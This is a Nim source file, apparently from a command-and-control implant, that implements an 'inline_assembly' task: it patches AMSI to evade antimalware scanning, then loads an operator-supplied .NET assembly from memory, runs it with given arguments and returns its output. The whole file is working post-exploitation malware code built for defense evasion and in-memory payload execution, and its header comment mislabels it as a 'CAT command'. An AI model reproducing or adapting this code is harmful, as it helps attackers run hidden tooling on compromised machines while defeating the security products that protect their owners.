# This is the source for the CAT command
import os
import json
import std/tables
import ../structs
import ../utils
import ../rth/rth
import ../fileManager
import ../rth/defense-evasion/bypass_amsi
import ../rth/local-execution/execute_assembly
from ../rth/utils/utils as rthu import decrypt

#[
Short Command Description
  {"path": "anwiththestruct"}

]#
proc cmd_inline_assembly*(task: Task): seq[TaskResponse] {.cdecl.} =
#proc cmd_inline_assembly*(task: Task): seq[TaskResponse] {.cdecl.} =


  let params = parseJson(task.parameters)
  let assembly = params["assembly_name"].getStr()
  let arguments = params["assembly_arguments"].getStr()

  # Configure Output
  var
    output = ""
    status = ""
  # Do the Magic

  if sharedBuffer.hasKey(assembly):
    if bypassAmsi():
      DBG("[+] AMSI Successfully patched")
      #var payload = Payload(bytes: hmPayloadBuffer[][assembly])
      var payload = Payload()
      payload.bytes = newSeq[byte](sharedBuffer[assembly][0])

      copyMem(addr payload.bytes[0], sharedBuffer[assembly][1], sharedBuffer[assembly][0])
      payload.arguments = parseCmdLine(arguments)
      payload.redirectStdout = true
      #payload.decrypt(0x5F)
      var resultExec = payload.execute()

      # It seems that something must have been gone wrong
      if not resultExec:
        status = "error"

      # return  the output of the command
      output = payload.output
      payload.output = "" # overwrite the output to save memory

    else:
      DBG("[-] Failed to patch AMSI")
      status = "error"

  else:
    status = "error"


  # return the response
  return buildReturnData(task.id, output, status)

